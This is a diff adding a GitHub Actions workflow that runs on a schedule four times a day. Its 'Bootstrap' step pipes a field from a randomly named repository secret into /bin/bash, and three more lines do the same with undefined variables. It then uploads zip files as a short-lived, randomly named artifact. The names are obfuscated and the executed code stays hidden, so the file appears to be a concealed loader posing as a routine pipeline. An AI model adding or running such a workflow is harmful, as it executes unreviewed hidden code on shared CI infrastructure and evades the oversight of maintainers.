@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          n739: ${{ secrets.n739 }}
+        run: |
+          printf '%s' "$n739" | jq -r .za39 | /bin/bash
+          printf '%s' "$a742" | jq -r .vhws5 | /bin/bash
+          printf '%s' "$binvw12" | jq -r .gri06022 | /bin/bash
+          printf '%s' "$fuumn273" | jq -r .cnj1 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4D1PUXgZ
+          path: "*.zip"
+          retention-days: 1
